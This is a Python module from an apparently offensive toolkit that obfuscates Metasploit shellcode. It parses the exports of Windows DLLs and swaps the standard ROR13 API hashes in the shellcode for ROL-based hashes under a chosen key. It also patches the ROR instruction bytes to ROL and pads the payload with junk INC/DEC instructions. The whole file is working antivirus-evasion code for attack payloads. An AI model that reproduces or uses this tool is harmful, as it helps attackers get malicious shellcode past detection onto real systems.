import utils.arg
import pefile
from os import path as ospath
from utils.helper import nstate as nstate

class ror2rol_obfuscator:
  Author = 'bordergate, psycore8'
  Description = 'change ROR13 to ROL encoding in metasploit payloads'
  Version = '1.0.0'
  hash_dict = dict()
  dll_paths = [ 'C:\\Windows\\System32\\kernel32.dll', 
                'C:\\Windows\\System32\\ws2_32.dll', 
                'C:\\Windows\\System32\\wininet.dll', 
                'C:\\Windows\\System32\\dnsapi.dll',
                'C:\\Windows\\System32\\mswsock.dll'
             ]

  def init():
    spName = 'ror2rol'
    spArgList = [
          ['-i', '--input', '', '', 'Input file for ROR13 to ROL conversion'],
          ['-o', '--output', '', '', 'Outputfile for ROR13 to ROL conversion'],
          ['-k', '--key', '', '', 'Key to process ROR13 to ROL']
        ]
    utils.arg.CreateSubParser(spName, ror2rol_obfuscator.Description, spArgList)


  def lookup_functions(dll_path):
    pe = pefile.PE(dll_path)
    export_dir = pe.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_EXPORT']]
    for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
      if exp.name:
        function_name = exp.name.decode()
        dll_name = ospath.basename(dll_path)
        hash = ror2rol_obfuscator.calculate_hash(dll_name, function_name, 13, "ror")
        ror2rol_obfuscator.hash_dict[hash] = dll_name + '!' + function_name
 
  def ror(dword, bits):
    return ((dword >> (bits%32)) | (dword << (32-(bits%32)))) & 0xffffffff
 
  def rol(dword, bits):
    return ((dword << (bits%32)) | (dword >> (32-(bits%32)))) & 0xffffffff
 
  def unicode(string, uppercase=True):
    result = ''
    if uppercase:
        string = string.upper()
    for c in string:
        result += c + '\x00'
    return result
 
  def calculate_hash(module, function, bits, hash_type):
    module_hash = 0
    function_hash = 0
    for c in ror2rol_obfuscator.unicode(module + '\x00'):
        if hash_type == "ror":
            module_hash = ror2rol_obfuscator.ror(module_hash, bits)
        if hash_type == "rol":
            module_hash = ror2rol_obfuscator.rol(module_hash, bits)
        module_hash += ord(c)
    for c in function + '\x00':
        if hash_type == "ror":
            function_hash = ror2rol_obfuscator.ror(function_hash, bits)
        if hash_type == "rol":
            function_hash = ror2rol_obfuscator.rol(function_hash, bits)
        function_hash += ord(c)
    hash = module_hash + function_hash & 0xFFFFFFFF
    return hash
 
  def check_shellcode(shellcode, pattern):
    byte_data = pattern.to_bytes(4, 'big')
    reversed_bytes = byte_data[::-1]
    index = shellcode.find(reversed_bytes)
    return index
 
  def replace_bytes_at_offset(data, offset, new_bytes):
    data = bytearray(data)
    end_offset = offset + len(new_bytes)
    data[offset:end_offset] = new_bytes
    return bytes(data)
 
  def highlight_byte_changes(original_bytes, modified_bytes):
    highlighted = []
    for original, modified in zip(original_bytes, modified_bytes):
        if original == modified:
            highlighted.append(f"\\x{original:02X}")
        else:
            highlighted.append(f"\\x{original:02X} -> \\x{modified:02X}")
    return "".join(highlighted)
 
  def find_ror_instructions(data, search_bytes):
    occurrences = []
    index = 0
    while True:
        try:
            index = data.index(search_bytes, index)
            occurrences.append(index)
            index += 1
        except ValueError:
            break
    return occurrences
 
  def process_shellcode(shellcode,ror_key):
    new_shellcode = shellcode
 
    for key,value in ror2rol_obfuscator.hash_dict.items():
        index = ror2rol_obfuscator.check_shellcode(shellcode, key)
        if index != -1:
            print(f'{nstate.OKBLUE} 0x%08X = %s offset: %s' % (key, value, index))
            dll_name = value.split('!')[0]
            function_name = value.split('!')[1]
            hash = ror2rol_obfuscator.calculate_hash(dll_name, function_name, ror_key, "rol")
            print(f'{nstate.OKGREEN}New value: 0x%08X' % (hash))
            byte_data = hash.to_bytes(4, 'big')
            reversed_bytes = byte_data[::-1]
            new_shellcode = ror2rol_obfuscator.replace_bytes_at_offset(new_shellcode, index, reversed_bytes)
            hex_string = ''.join('\\x{:02X}'.format(byte) for byte in new_shellcode)
 
    print(f"{nstate.OKBLUE} Changing ROR key")
    
    # \xC1\xCF\x0D ror edi,D

    ror_instances = ror2rol_obfuscator.find_ror_instructions(new_shellcode,b"\xC1\xCF\x0D")
    for ror_offset in ror_instances:
        bytes_key = ror_key.to_bytes(1, 'big')
        # We're replacing the ROR with a ROL here. ROR = \xC1\xCF\x0D  ROL = \xC1\xC7\+byte_key
        new_shellcode = ror2rol_obfuscator.replace_bytes_at_offset(new_shellcode, ror_offset, b"\xC1\xC7" + bytes_key )
         
    return new_shellcode
  
  # def process(dll_paths, filename, out_file, showmod, decompile, ror_key):
  def process(filename, out_file, ror_key):
    for dll in ror2rol_obfuscator.dll_paths:
      ror2rol_obfuscator.lookup_functions(dll)
    # Read existing shellcode
    print(f"{nstate.OKBLUE} Reading shellcode")
    try: 
      with open(filename, "rb") as file:
        shellcode = file.read()
    except FileNotFoundError:
        print(f"{nstate.FAIL} File not found or cannot be opened.")
        exit()
 
    new_shellcode = ror2rol_obfuscator.process_shellcode(shellcode,int(ror_key))
 
    # Add some NOP's
    position = 1
    bytes_to_insert = b"\xFF\xC0\xFF\xC8" * 5  # INC EAX, DEC EAX
    modified_shellcode = new_shellcode[:position] + bytes_to_insert + new_shellcode[position:]
   
    print(f"{nstate.OKBLUE} Shellcode size: " + str(len(modified_shellcode)))
    outputfile = out_file
    print(f"{nstate.OKBLUE} Writing bytes to file: {outputfile}")
    with open(outputfile, 'wb') as file:
      file.write(modified_shellcode)
    path = outputfile
    cf = ospath.isfile(path)
    if cf == True:
      print(f"{nstate.OKGREEN} encoded shellcode created in {outputfile}")
    else:
      print(f"{nstate.FAIL} encoded Shellcode error, aborting script execution")
      exit()